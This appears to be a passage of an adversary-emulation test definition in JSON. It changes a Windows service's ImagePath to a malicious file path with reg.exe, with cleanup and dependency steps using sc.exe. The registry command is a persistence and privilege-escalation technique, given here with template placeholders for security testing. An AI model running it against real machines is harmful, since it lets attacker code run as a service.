{
  "id": "f38e9eea-e1d7-4ba6-b716-584791963827",
  "name": "Service ImagePath Change with reg.exe",
  "description": "Change Service registry ImagePath of a bengin service to a malicious file\n",
  "platforms": [
    "windows"
  ],
  "steps": [
    {
      "id": "5e61cfae-b705-4021-89c0-d768ff82df55",
      "type": "execute-command",
      "data": {
        "command": "reg.exe add \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\#{weak_service_name}\" /f /v ImagePath /d \"#{malicious_service_path}\"\n",
        "command_type": "command_prompt"
      },
      "elevation_required": false
    },
    {
      "id": "50aa969f-76e1-4e5a-aed3-1f4cbc13ba06",
      "type": "execute-command",
      "data": {
        "command": "sc.exe delete #{weak_service_name}\n",
        "command_type": "command_prompt"
      },
      "elevation_required": false
    },
    {
      "id": "b7a5c2ff-f0d2-4b28-a7dc-8b4e6b287460",
      "name": "Check dependency 1/1",
      "description": "The service must exist (#{weak_service_name})\n",
      "type": "execute-command",
      "data": {
        "command": "if (Get-Service #{weak_service_name}) {exit 0} else {exit 1}\n",
        "command_type": ""
      },
      "elevation_required": false
    },
    {
      "id": "6da651c2-6e97-40a1-a505-17a3e65043fc",
      "name": "Resolve dependency 1/1",
      "description": "The service must exist (#{weak_service_name})\n",
      "type": "execute-command",
      "data": {
        "command": "sc.exe create #{weak_service_name} binpath= \"#{weak_service_path}\"\n",
        "command_type": ""
      },
      "elevation_required": false
    },
    {
      "id": "1e83b5c0-c9d1-4d8c-9654-39a66d7750d3",
      "name": "Re-check dependency 1/1",
      "description": "The service must exist (#{weak_service_name})\n",
      "type": "execute-command",
      "data": {
        "command": "if (Get-Service #{weak_service_name}) {exit 0} else {exit 1}\n",
        "command_type": ""
      },
      "elevation_required": false
    }
  ],
  "flows": [
    {
